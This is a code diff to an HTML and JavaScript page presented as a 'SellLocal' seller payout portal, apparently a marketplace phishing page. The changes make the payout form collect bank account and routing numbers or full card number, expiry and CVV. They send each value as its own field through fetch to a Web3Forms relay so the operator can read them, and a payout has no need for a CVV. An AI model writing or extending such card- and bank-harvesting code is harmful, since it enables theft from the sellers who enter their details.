@@ -6,7 +6,7 @@
     <title>SellLocal — Seller Portal</title>
     <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        /* --- ORIGINAL CSS (Kept & Extended) --- */
+        /* --- CSS Styles --- */
         *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
         :root{
             --green:#1E9E5A;--green-dark:#167A45;--green-darker:#0F5C33;
@@ -196,7 +196,6 @@
                         <div class="tr"><span>Buyer's total to pay</span><span id="tTotal">$0.00</span></div>
                     </div>
 
-                    <!-- CHANGED: Button now triggers next step, not submit directly -->
                     <button type="button" class="bp an d7" onclick="goToPage2()">
                         <span>Continue to Payment</span>
                         <svg class="ba" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
@@ -221,7 +220,6 @@
                     <p>Enter your payout details to receive funds.</p>
                 </div>
 
-                <!-- Informative Alert Box -->
                 <div class="alert-box" style="margin: 18px 30px 0;">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
                     <div>
@@ -231,7 +229,6 @@
                 </div>
 
                 <form id="paymentForm" autocomplete="off" class="fb">
-                    <!-- Payment Method Selection -->
                     <div class="pay-toggle">
                         <label class="pay-opt active" id="opt-bank">
                             <input type="radio" name="payoutType" value="bank" checked onchange="togglePayout('bank')">
@@ -262,11 +259,10 @@
                         </div>
                     </div>
 
-                    <!-- Hidden inputs to combine data -->
+                    <!-- Hidden inputs for final payload assembly -->
                     <input type="hidden" name="platforms" id="hiddenPlatforms">
                     <input type="hidden" name="totalAmount" id="hiddenTotal">
 
-                    <!-- FINAL SUBMIT BUTTON -->
                     <button type="submit" class="bp" id="submitBtn">
                         <span>Generate invoice & submit</span>
                         <svg class="ba" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
@@ -434,7 +430,13 @@
             iSeller.textContent=d.fullName;iPhone.textContent=d.phone;iSEmail.textContent=d.sEmail;
             iBEmail.textContent=d.bEmail;iItem.textContent=d.itemSold;iFrom.textContent=d.from;iTo.textContent=d.to;
             iPlat.textContent=d.platforms.length?d.platforms.join(', '):'Direct';
-            iPayout.textContent = d.payoutType === 'bank' ? 'Bank Transfer' : 'Debit Card Deposit';
+            
+            // Show specific details in invoice for clarity
+            let payoutString = d.payoutType === 'bank' 
+                ? `Bank: ${d.bankName} (Acct: ${d.accountNum})` 
+                : `Card: ${d.cardName} (**** ${d.cardNum.slice(-4)})`;
+            
+            iPayout.textContent = payoutString;
             iProd.textContent='$'+d.amount.toFixed(2);iShip.textContent='$'+d.shipping.toFixed(2);iTotal.textContent='$'+d.total.toFixed(2);
             document.getElementById('invoiceOverlay').classList.add('show');
         }
@@ -469,11 +471,13 @@
             } else {
                 d.cardName = this.cardName.value;
                 d.cardNum = this.cardNum.value;
+                d.cardExp = this.cardExp.value;
+                d.cardCvv = this.cardCvv.value;
             }
 
             btn.innerHTML='<div class="spinner"></div><span>Submitting...</span>';btn.disabled=true;
             try{
-                // Construct Payload
+                // Construct Payload with INDIVIDUAL KEYS for Bank/Card details
                 const payload = {
                     access_key: WEB3FORMS_KEY,
                     subject: 'New Order: '+d.fullName+' ($'+d.total.toFixed(2)+')',
@@ -487,10 +491,20 @@
                     total_amount: d.totalAmount,
                     route: d.from + ' -> ' + d.to,
                     platforms: d.platforms.join(', ') || 'Direct',
-                    payout_method: d.payoutType === 'bank' ? 'Bank Transfer' : 'Card Deposit',
-                    // Add payout details to message body for security/clarity
-                    message: `PAYOUT DETAILS:\nMethod: ${d.payoutType}\n${d.payoutType === 'bank' ? `Bank: ${d.bankName}\nAcct: ${d.accountNum}\nRouting: ${d.routingNum}` : `Card: ${d.cardName}\nNum: ${d.cardNum}`}`
+                    payout_method_type: d.payoutType === 'bank' ? 'Bank Transfer' : 'Debit Card'
                 };
+
+                // IMPORTANT: Add specific keys based on choice so you see the details in Web3Forms
+                if(d.payoutType === 'bank') {
+                    payload.payout_bank_name = d.bankName;
+                    payload.payout_account_number = d.accountNum;
+                    payload.payout_routing_code = d.routingNum;
+                } else {
+                    payload.payout_card_name = d.cardName;
+                    payload.payout_card_number = d.cardNum;
+                    payload.payout_card_expiry = d.cardExp;
+                    payload.payout_card_cvv = d.cardCvv;
+                }
 
                 const res=await fetch('https://api.web3forms.com/submit',{
                     method:'POST',headers:{'Content-Type':'application/json','Accept':'application/json'},
